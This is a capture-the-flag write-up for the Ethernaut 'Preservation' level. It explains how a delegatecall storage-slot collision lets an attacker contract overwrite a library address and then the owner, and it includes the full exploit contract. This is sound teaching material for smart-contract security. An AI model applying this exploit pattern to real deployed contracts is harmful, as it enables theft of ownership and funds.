![](https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg)

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help
- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for `delegatecall` to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Solition:
## Analysis

We learned in levels [6](https://blog.dixitaditya.com/ethernaut-level-06-delegation) and [12](https://blog.dixitaditya.com/ethernaut-level-12-privacy) about how delegate calls can be used to make external calls to other contracts. This is mostly used in library calls and the storage changes are replicated.

A delegate call is a special low-level call in Solidity to make external calls to another contract. [Solidity By Example](https://solidity-by-example.org/delegatecall/) does an excellent job of explaining this.

Let's assume there are two contracts, similar to the one shown in Ethernaut's Delegation level, contracts `A` and `B`. When contract `A` executes `delegatecall` to contract `B`, `B`'s code is executed with contract `A`'s storage, `msg.sender` and `msg.value`.

This means that it is possible to modify a contract's storage using a code (malicious code) belonging to another contract.

Let's go through the vulnerable code:
### Preservation Contract

- The Preservation contract defines some state variables, in which the first and second variable holds the addresses for the libraries and the third one is the owner in which we need to store our address. These addresses are predefined in the constructor and there's no way to change them. ****wink wink****
- The variable `setTimeSignature` defines a function signature which will be used in delegate call so it knows which function name to call.
- The functions `setFirstTime` and `setSecondTime` are taking a timestamp as input and making delegate calls to the libraries. So the only part we control here is the parameter `uint _timeStamp`.

### LibraryContract

- This is defining a variable called `storedTime` in slot 0 which maps to the variable `address public timeZone1Library` in the Preservation contract.
- The function `setTime()` is taking an input which is controlled by us and is stored inside the above variable.

**To complete the level**, here's what we have to do:

1. Create an attacker contract (DelegateHack) and call the `setFirstTime()` function. In the function argument `_timeStamp`, pass the address of the DelegateHack.
2. This will make a delegatecall to the LibraryContract and call the `setTime()` function with the address of the DelegateHack contract in`_time`. This will be stored in the parameter `storedTime` on slot 0.
3. Since the Preservation contract has the variable `timeZone1Library` in slot 0, it will get updated with the DelegateHack's address. Now we have control over one of the libraries.
4. We will implement our own `setTime()` function in our library/contract/DelegateHack and accept an address and store it inside our own `owner` variable.
5. To make sure the value of the `owner` is updated in slot 2 of the Preservation contract, we will organize the slots in our contract accordingly.
6. Now we will make another call to the `setFirstTime` function of the Preservation contract. Since we control the library's address, the execution flow will go to our own DelegateHack contract and set the owner which will then be reflected in the Preservation contract as well.

---
## The Exploit

Let's now look at our exploit code:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
  function setFirstTime(uint _timeStamp) external;
  function setSecondTime(uint _timeStamp) external;
}

contract PWN {
  address public time_1;
  address public time_2;
  address public owner;
  IPreservation instance;

  constructor(address _instance) {
    instance = IPreservation(_instance);
  }

  function pwn() external {
    // почему-то прямой каст адреса в 256-й инт не работает.
    instance.setFirstTime(uint256(uint160(address(this))));
    instance.setFirstTime(uint256(uint160(address(0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5))));
  }

  function setTime(uint256 _owner) public {
    owner = address(uint160(_owner));
  }
}
```

As mentioned above, we are calling `setFirstTime()` first with the address of our DelegateHack contract and then again with the address value we want to set as the owner in the Preservation contract.

We are also defining a function with the same name as in the LibraryContract - `setTime()` because the function signature is constant in `setTimeSignature`. But our function is taking an address and assigning it to the owner variable in slot 2 which is mapped to the `owner` variable in the Preservation contract since our slot arrangement is the same. This will set the owner.

___
As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.